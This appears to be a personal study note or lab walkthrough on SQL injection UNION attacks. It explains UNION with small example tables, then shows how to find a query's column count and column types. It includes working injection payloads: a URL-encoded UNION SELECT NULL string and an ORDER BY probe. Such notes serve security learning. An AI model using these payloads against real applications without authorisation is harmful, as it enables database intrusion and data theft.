SQL Injection - 

END GOAL : Perform SQLi UNION attack and return the no of columns by the query. 

Background (Union):

Consider the below tables,
Table_1         Table_2
a | b           c | d
-----           -----
1 , 2           2 , 3
3 , 4           4 , 5

Query #1: Select a, b from Table_1
Result :
1 , 2
3 , 4

Query #2: Select a, b from Table_1 UNION select c, d from Table_2
Result : 
1 , 2
3 , 4
2 , 3
4 , 5

Rules:
1. The number and the order of the columns must be the same in all queries.
2. The data types must be compatible

STEP #1 : 
Probable SQL Statement # 1 : 
SELECT ? from Table_1 UNION select NULL 
Possible Results:
Error -> Incorrect number of columns

SELECT ? from Table_1 UNION select NULL, NULL, ... - Iteratibily until we get a 200 Response Code which indicates we have reached the correct number of columns

Probable SQL Statement # 2:
SELECT a, b from Table_1 order by 1(First Column)

Analysis:
If we put ' in the Username input field, it gives Internal Server Error(broke the application at the back-end) meaning its vulnerable to SQLi Attacks

Exploit Payload
---------------
SQL Statement #1
'+UNION+select+NULL,+NULL,+NULL

SQL Statement #2
'ORDER+BY+4--

STEP #2: Determine the data type of the columns

select a, b, c from Table_1 UNION select 'a', NULL, NULL
-> Error : Column is not of text type
-> No Error : Column is of text type
